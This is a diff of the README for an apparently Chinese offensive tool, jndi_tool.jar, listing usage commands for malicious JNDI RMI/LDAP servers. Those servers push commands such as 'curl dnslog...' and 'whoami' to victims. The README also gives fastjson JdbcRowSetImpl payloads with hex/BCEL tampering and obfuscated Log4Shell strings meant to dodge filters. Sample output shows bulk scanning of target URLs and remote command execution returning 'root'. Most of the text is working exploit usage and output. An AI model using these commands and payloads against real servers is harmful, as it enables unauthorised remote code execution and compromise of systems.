@@ -5,20 +5,21 @@
 
 download_url : https://toolaffix.oss-cn-beijing.aliyuncs.com/jndi_tool.jar
 
-# 2022-01-07 修复了log4j批量检测的一个BUG以及做了优化，结果会保存到 log4j_result.txt
-log4j检测，建议用 0 或者 4 的payload ,相对通用一些
-
 
 > java -jar jndi_tool.jar 
 Usage:
-jndi:
+jndi_http:
 java -cp jndi_tool.jar jndi.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
 java -cp jndi_tool.jar jndi.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
 
+rmi_high_jdk:
 java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" el-win/el-linux/groovy
-java -cp jndi_tool.jar jndi.LDAPRefServer 1099 
 
-java -cp jndi_tool.jar jndi.HLDAPServer2 127.0.0.1 80 "whoami"  
+ldap_normal:
+java -cp jndi_tool.jar jndi.LDAPRefServer 1099 host=127.0.0.1
+
+ldap_auto:
+java -cp jndi_tool.jar jndi.LDAPRefServerAuto 127.0.0.1 1099 80 file=filename (param_format: __JNDI__) 
 
 fastjson:
 java -cp jndi_tool.jar jndi.fastjson.LDAPRefServerAuto 127.0.0.1 1099 file=filename tamper=tohex chunk=on
@@ -26,10 +27,11 @@ java -cp jndi_tool.jar jndi.fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
 java -cp jndi_tool.jar jndi.fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1099/Object\",\"autoCommit\":true}}" 
 
 log4j:
-java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target  w=tomcat/groory/http  default:http
-java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
+java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target w=tomcat/groory/http  default:http
 java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true
-java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.txt 
+java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.txt thread=10    log4j检测，建议用 0 或者 4 的payload ,相对通用一些
+
+
 
 
 
@@ -49,7 +51,6 @@ java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.
 [-] please chosse payload, or input payload like payload=${......}
 > 4
 [-] payload: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://****/xobject}
-
 > threads: 1
 > url count: 1
 [-] start exploit. waiting...
@@ -73,7 +74,6 @@ java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.
 [-] please chosse payload, or input payload like payload=${......}
 > 4
 [-] payload: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://********/xobject}
-
 > threads: 2
 > url count: 2
 [-] start exploit. waiting...
@@ -81,12 +81,6 @@ java -cp jndi_tool.jar jndi.log4j.Log4j 127.0.0.1 80 url=http://xx.xx or urls=1.
 >> target is vul: http://xx.xx.xx
 [-] waiting exit...
 [-] exit. 
-
-
-
-
-# 2021-12-24 优化了细节
-# 2021-12-18 优化了细节
 
 
 1. 新增LOG4J相关检测
@@ -133,6 +127,8 @@ root
 [-] input class: tomcat, command: curl xx.xx.xx
 [*] Send data...
 [-] exit.
+
+
 
 
 > java -cp jndi_tool.jar jndi.log4j.Tamper "\${jndi:ldap://127.0.0.1/a}"  random=true
